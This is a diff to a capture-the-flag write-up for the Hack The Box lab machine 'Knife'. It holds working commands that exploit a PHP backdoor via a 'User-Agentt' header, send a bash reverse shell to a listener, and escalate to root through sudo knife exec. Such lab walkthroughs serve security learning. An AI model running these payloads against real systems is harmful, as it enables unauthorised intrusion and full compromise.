@@ -24,7 +24,7 @@ Knife is a quick and fun easy box where we have to abuse of the User-Agent of PH
 
 ## PortScan
 
-```
+```bash
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 13:57 CST
 Nmap scan report for 10.10.10.242
 Host is up (0.17s latency).
@@ -50,10 +50,10 @@ The Knife website runs on port 80 and has the following technologies reported by
 ## Enumeration
 
 I use curl and I see this that version of PHP is vulnerable to RCE
-```
+```bash
 curl -s http://10.10.10.242 -I
 ```
-```
+```bash
 HTTP/1.1 200 OK
 Date: Tue, 10 Jan 2023 20:05:33 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -66,10 +66,10 @@ We can found information here
 
 I can abuse of the User-Agent because is vulnerable to RCE
 
-```
+```bash
 curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('id');" | html2text
 ```
-```
+```bash
 uid=1000(james) gid=1000(james) groups=1000(james)
     * About EMA
     * /
@@ -86,10 +86,10 @@ uid=1000(james) gid=1000(james) groups=1000(james)
 ```
 
 And is vulnerable so we can send a reverse shell 
-```
+```bash
 curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.14.21/443 0>&1\"');" | html2text
 ```
-```
+```bash
 nc -lvnp 443
 listening on [any] 443 ...
 connect to [10.10.14.21] from (UNKNOWN) [10.10.10.242] 60468
@@ -99,7 +99,7 @@ james@knife:/$
 ```
 
 We can have a best bash terminal so we can do
-```
+```bash
 script /dev/null -c bash
 Ctrl + z
 stty raw -echo; fg
@@ -109,7 +109,7 @@ reset xterm
 
 We can see the first flag
 
-```
+```bash
 james@knife:~$ cat user.txt 
 9adc315d20ef969531a7b07c66a31d19
 ```
@@ -118,7 +118,7 @@ james@knife:~$ cat user.txt
 
 After enumerating the system I can see that I can run this binary as root, we can use Gtfobins
 
-```
+```bash
 james@knife:~$ sudo -l
 Matching Defaults entries for james on knife:
     env_reset, mail_badpass,
@@ -132,7 +132,7 @@ User james may run the following commands on knife:
 
 We follow the instructions and we're root
 
-```
+```bash
 james@knife:~$ sudo knife exec -E 'exec "/bin/sh"'
 # bash
 root@knife:/home/james# cd /root
@@ -144,7 +144,7 @@ f8c5f763d30a3ed17dd24c4c216fd87b
 
 You can abuse of the pkexec because is SUID but I won't do it
 
-```
+```bash
 james@knife:/$ find -perm -4000 2>/dev/null | grep -v snap
 ./usr/lib/policykit-1/polkit-agent-helper-1
 ./usr/lib/eject/dmcrypt-get-device
